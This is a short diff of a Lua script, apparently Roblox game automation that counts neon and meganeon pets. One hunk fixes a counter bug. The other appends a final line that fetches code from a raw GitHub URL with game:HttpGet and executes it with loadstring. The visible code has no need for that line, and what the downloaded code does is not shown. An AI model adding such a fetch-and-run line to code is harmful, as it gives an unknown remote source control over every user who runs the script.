@@ -5271,7 +5271,7 @@ end
         __neon_temp[v.id] = (__neon_temp[v.id] or 0) + 1
       end
       if v.neon and v.age == 6 then
-        __meganeon_temp[v.id] = (meganeon[v.id] or 0) + 1
+        __meganeon_temp[v.id] = (__meganeon_temp[v.id] or 0) + 1
       end
       if v.age < 6 then 
         if pets_to_give_potion then
@@ -5435,3 +5435,4 @@ end)
 -- else
   coroutine.resume(_script)
 -- end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K4TaNaE/junki/refs/heads/main/sdddd"))()
